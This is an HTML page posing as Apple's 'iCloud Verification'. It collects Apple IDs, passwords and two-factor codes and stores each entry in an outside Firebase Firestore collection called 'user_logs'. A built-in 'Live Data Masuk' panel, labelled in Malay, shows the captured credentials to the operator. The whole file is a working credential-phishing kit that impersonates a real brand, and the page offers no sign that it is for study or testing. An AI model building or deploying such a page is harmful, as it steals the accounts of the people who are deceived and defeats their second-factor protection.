<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iCloud Support</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getFirestore, collection, addDoc, getDocs, serverTimestamp, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCQiF7tkxdjLzv9CX_sDXL...",
      authDomain: "icloud-simulation.firebaseapp.com",
      projectId: "icloud-simulation",
      storageBucket: "icloud-simulation.appspot.com",
      messagingSenderId: "768044710293",
      appId: "1:768044710293:web:009eeb59c..."
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.submitData = async function(e) {
      e.preventDefault();
      const appleId = document.getElementById('appleId').value;
      const password = document.getElementById('password').value;
      const code = document.getElementById('code').value;

      try {
        await addDoc(collection(db, "user_logs"), {
          appleId,
          password,
          code,
          time: serverTimestamp()
        });
        alert('Hantar berjaya!');
        document.getElementById('myForm').reset();
        loadData();
      } catch (err) {
        alert('Ralat simpan data: ' + err.message);
        console.error(err);
      }
    };

    window.loadData = async function() {
      const listDiv = document.getElementById('dataList');
      listDiv.innerHTML = '<p class="text-zinc-500">Memuatkan...</p>';
      try {
        const q = query(collection(db, "user_logs"));
        const querySnapshot = await getDocs(q);
        listDiv.innerHTML = '';
        querySnapshot.forEach((doc) => {
          const d = doc.data();
          listDiv.innerHTML += `
            <div class="bg-zinc-800/60 p-2 rounded border border-zinc-700/50 mb-2">
              <p>ID: ${d.appleId}</p>
              <p>Pass: ${d.password}</p>
              <p>Code: ${d.code || '-'}</p>
            </div>
          `;
        });
        if (listDiv.innerHTML === '') {
          listDiv.innerHTML = '<p class="text-zinc-500">Tiada data lagi</p>';
        }
      } catch (err) {
        listDiv.innerHTML = '<p class="text-red-400 text-xs">Ralat muat data (pastikan Firestore dah enable).</p>';
        console.error(err);
      }
    };
    window.addEventListener('DOMContentLoaded', loadData);
  </script>
</head>
<body class="bg-zinc-950 text-zinc-100 min-h-screen p-4 flex flex-col items-center space-y-6">

  <!-- Borang Pengguna -->
  <div class="max-w-md w-full bg-zinc-900 border border-zinc-800 rounded-2xl p-6 shadow-xl space-y-4">
    <div class="flex items-center space-x-3 border-b border-zinc-800 pb-3">
      <!-- Ikon iCloud -->
      <svg class="w-6 h-6 text-sky-400" viewBox="0 0 24 24" fill="currentColor">
        <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM19 18H6c-2.21 0-4-1.79-4-4 0-2.05 1.53-3.76 3.56-3.97l1.07-.11.5-.95C8.08 7.14 9.94 6 12 6c2.62 0 4.88 1.86 5.39 4.43l.3 1.5 1.53.11c1.56.1 2.78 1.41 2.78 2.96 0 1.65-1.35 3-3 3z"/>
      </svg>
      <h2 class="text-base font-semibold">iCloud Verification</h2>
    </div>
    <form id="myForm" onsubmit="submitData(event)" class="space-y-3 text-xs">
      <div>
        <label class="block text-zinc-400 mb-1">Apple ID / Email</label>
        <input type="text" id="appleId" required class="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-zinc-100">
      </div>
      <div>
        <label class="block text-zinc-400 mb-1">Password</label>
        <input type="password" id="password" required class="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-zinc-100">
      </div>
      <div>
        <label class="block text-zinc-400 mb-1">Verification Code</label>
        <input type="text" id="code" class="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-zinc-100">
      </div>
      <button type="submit" class="w-full bg-sky-500 hover:bg-sky-400 text-zinc-950 font-semibold py-2 rounded-lg">Verify</button>
    </form>
  </div>

  <!-- Panel untuk B nampak data masuk -->
  <div class="max-w-md w-full bg-zinc-900 border border-zinc-800 rounded-2xl p-6 shadow-xl space-y-3">
    <div class="flex justify-between items-center border-b border-zinc-800 pb-2">
      <h3 class="text-sm font-semibold text-zinc-300">Live Data Masuk</h3>
      <button onclick="loadData()" class="text-xs text-sky-400 underline">Refresh</button>
    </div>
    <div id="dataList" class="space-y-2 text-xs max-h-48 overflow-y-auto"></div>
  </div>

</body>
</html>
